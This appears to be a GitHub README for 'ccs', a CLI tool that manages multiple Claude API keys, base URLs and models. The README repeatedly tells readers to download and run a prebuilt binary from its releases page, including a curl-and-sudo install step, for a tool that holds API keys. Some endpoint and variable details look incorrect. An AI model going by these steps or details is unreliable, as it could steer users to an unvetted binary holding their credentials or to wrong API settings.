# ccs — Manage Multiple Claude API Configurations from CLI 🚀

[![Releases](https://img.shields.io/badge/Releases-v--latest-blue?logo=github)](https://github.com/breakwuz/ccs/releases) [![Topic: claude-code](https://img.shields.io/badge/topic-claude--code-green)](https://github.com/topics/claude-code)

![Hero image showing terminal and code](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=8b8b7d0f2a2a2d3d5b7e44f1a3f9d5a3)

A small command-line tool to manage multiple Claude API keys and base URLs. Switch between accounts and environments with a single command. The tool works with configuration files and environment variables. It fits into CI, local scripts, or a developer workstation.

Get the release binary from the releases page:
https://github.com/breakwuz/ccs/releases

Quick links
- Releases: https://github.com/breakwuz/ccs/releases (download the binary file for your platform and run it)
- Topic: claude-code

Table of contents
- Features
- Install
- Getting started
- Commands
- Configuration file
- Examples
- Shell integration
- Tips and best practices
- Contributing
- License

Features
- Manage multiple Claude API configs (name, API key, base URL, model)
- Switch active config with one command
- List and validate configs
- Export active config to environment variables for scripts
- Support for per-directory .ccsrc file
- Commands for import/export and token masking
- Small binary with no runtime dependencies

Install

Download the correct release binary from the releases page and run it. The releases page hosts platform builds. Pick the file that matches your OS (linux, mac, windows) and architecture (amd64, arm64).

Steps (example for Linux/macOS):
1. Open the releases page: https://github.com/breakwuz/ccs/releases
2. Download the binary file for your system (for example: ccs-linux-amd64 or ccs-darwin-amd64).
3. Make it executable and move it into your PATH:
   ```
   curl -L -o ccs https://github.com/breakwuz/ccs/releases/download/v1.2.3/ccs-linux-amd64
   chmod +x ccs
   sudo mv ccs /usr/local/bin/
   ```
4. Test:
   ```
   ccs --version
   ```

Windows (PowerShell):
1. Visit https://github.com/breakwuz/ccs/releases
2. Download ccs-windows-amd64.exe
3. Run from PowerShell:
   ```
   .\ccs-windows-amd64.exe --version
   ```

If the releases link ever breaks, check the Releases section on this repository page.

Getting started

Initialize a config store (creates a config file in your home directory by default):
```
ccs init
```

Add a config for a Claude API account:
```
ccs add my-work-account \
  --api-key sk-xxxxxxxxxxxxxxxx \
  --base-url https://api.claude.ai \
  --model claude-2
```

List configs:
```
ccs list
```

Set an active config:
```
ccs use my-work-account
```

Export environment variables for current shell:
```
eval $(ccs env)
# now CLAUDE_API_KEY and CLAUDE_BASE_URL are set in your shell
```

Commands

ccs init
- Create a default config file (~/.ccsrc by default). Use --path to place the file elsewhere.

ccs add <name> [flags]
- Add a new config. Flags:
  --api-key string
  --base-url string
  --model string
  --description string

ccs list
- Show saved configs. The active config shows with a marker.

ccs use <name>
- Set active config by name. The tool updates the local config store and prints the active entry.

ccs show [name]
- Print a single config in plain text or JSON. Use --json to get JSON output.

ccs env [--shell=bash|zsh|powershell]
- Print shell export commands for the active config. Use eval $(ccs env) or run the specific shell form.

ccs validate [name]
- Run a small API call to validate the stored API key and base URL. This command uses the minimal API call that Claude accepts for a key check.

ccs import <file>
- Import configs from a JSON or YAML file.

ccs export <file>
- Export all configs to a JSON or YAML file.

ccs remove <name>
- Delete a saved config.

ccs mask <name>
- Show masked keys. Use when you must print config info in logs.

Configuration file

The default config file sits at:
- Unix: ~/.ccsrc
- Windows: %USERPROFILE%\.ccsrc

Config format (YAML)
```
active: work
configs:
  work:
    api_key: sk-xxxxxxxxxxxxxxxx
    base_url: https://api.claude.ai
    model: claude-2
    description: Work account
  personal:
    api_key: sk-yyyyyyyyyyyyyyyy
    base_url: https://api-eu.claude.ai
    model: claude-2.1
    description: Personal account
```

Fields
- api_key: The CLAUDE API key.
- base_url: The full base URL for the Claude API endpoint.
- model: The model name you wish to call.
- description: Optional text.

You can also store configs in JSON. The CLI reads both formats.

Per-directory config
Drop a .ccsrc file in a project directory. When you run ccs inside that directory, the tool prefers the local .ccsrc over the global file. This helps keep credentials separate for project work.

Examples

Switching accounts for a script:
```
# switch to CI account
ccs use ci-account
eval $(ccs env)
python generate.py
```

Automated test flow:
1. Use a temporary config injected by CI.
2. Run ccs validate to ensure the key is valid.
3. Run the tests that use Claude.

Create a new config from environment variables:
```
ccs add temp \
  --api-key "$CLAUDE_API_KEY" \
  --base-url "$CLAUDE_BASE_URL" \
  --model "${CLAUDE_MODEL:-claude-2}"
```

Import export example:
```
ccs export ~/backup/ccs-backup.yaml
# edit file, then import on another machine
ccs import ~/backup/ccs-backup.yaml
```

Shell integration

Bash / Zsh
Add this to ~/.bashrc or ~/.zshrc to auto-switch when you enter a project with a .ccsrc file:
```
function ccs_cd_hook() {
  if [ -f .ccsrc ]; then
    eval $(ccs env)
  fi
}
autoload -U add-zsh-hook
add-zsh-hook chpwd ccs_cd_hook
ccs_cd_hook
```

PowerShell
A simple helper function:
```
function Set-CCSEnv {
  $envOut = ccs env --shell=powershell
  Invoke-Expression $envOut
}
Set-CCSEnv
```

Tips and best practices

- Do not commit API keys to git. Keep ~/.ccsrc or .ccsrc out of your repo. Use a secret manager where possible.
- Use descriptive names for configs (work, personal, ci, staging).
- Use ccs mask before printing config contents in logs.
- Keep the base_url precise. If your org routes Claude traffic through a proxy, set base_url to that proxy endpoint.
- Use the validate command in CI to fail early when credentials break.

Security model

ccs stores API keys in the config file. The file permission matters. On Unix, ensure the file is readable only by your user:
```
chmod 600 ~/.ccsrc
```

The tool never sends configs to third-party servers. It calls Claude only when you run validate or use the env export plus other features that hit the API. Use the mask command to hide keys in logs.

Advanced usage

Programmatic output
- Use --json on list and show to parse configs in scripts.
```
ccs list --json | jq '.configs | keys'
```

Profiles per environment
- Create profiles for envs like staging or production, and switch them in deployment scripts.

CI integration
- Store a minimal config in CI secrets and create a config at job start:
```
ccs add ci --api-key "$CI_CLAUDE_KEY" --base-url "$CI_CLAUDE_URL" --model claude-2
ccs use ci
eval $(ccs env)
```

Troubleshooting

If ccs does not run after download, check file permissions and PATH. If releases change, go to the releases page and download the matching binary for your OS:
https://github.com/breakwuz/ccs/releases

If a validate call fails, confirm api_key and base_url. Use ccs show <name> to inspect the saved config.

Contributing

- Open an issue for bugs or feature requests.
- Fork the repo and submit a pull request.
- Follow the code style guidelines in CONTRIBUTING.md.
- Add tests for new features.

Release downloads

Download the binary file for your OS from the releases page and run it. The releases page lists assets per release. Pick the right asset and follow the platform-specific install steps above.
https://github.com/breakwuz/ccs/releases

Badges and images

- Releases badge links directly to the release page.
- Topic badge points to the claude-code topic.

Legal

This project uses an open source license. See the LICENSE file in the repository for details.

Contact

For questions or help, open an issue on GitHub and tag it with "help" or "question". Use the claude-code topic when appropriate.

License

MIT License

